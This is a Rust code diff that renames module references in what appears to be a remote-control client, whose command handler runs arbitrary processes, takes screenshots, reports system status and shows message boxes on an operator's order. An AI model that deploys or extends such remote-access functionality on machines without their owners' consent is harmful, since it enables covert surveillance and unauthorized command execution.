@@ -7,7 +7,7 @@ use async_recursion::async_recursion;
 use tracing::{debug, error, info};
 
 use crate::unwrap::CustomUnwrap;
-use crate::utils::*;
+use crate::utils;
 
 #[async_recursion(?Send)]
 pub async fn connect(addr: String) {
@@ -147,20 +147,20 @@ impl Client {
                 // send message box
                 "msg" => {
                     if self.check_args(args.clone(), 1)? {
-                        Utils::messagebox(args.join(" "));
+                        utils::messagebox(args.join(" "));
                         self.send("Done")?;
                     }
                 }
 
                 // get system status
                 "stat" => {
-                    self.send(&Utils::stat())?;
+                    self.send(&utils::stat())?;
                 }
                 "run" => {
                     if args.clone().is_empty() {
                         self.send("Missing argument")?;
                     } else {
-                        Utils::run_process(args[0], vec![args[1]], false)?;
+                        utils::run_process(args[0], vec![args[1]], false)?;
                         self.send("Done")?;
                     }
                 }
@@ -185,7 +185,7 @@ impl Client {
                 }
 
                 "screenshot" => {
-                    let url = Utils::screenshot_url().await?;
+                    let url = utils::screenshot_url().await?;
 
                     self.send(&url)?;
                 }
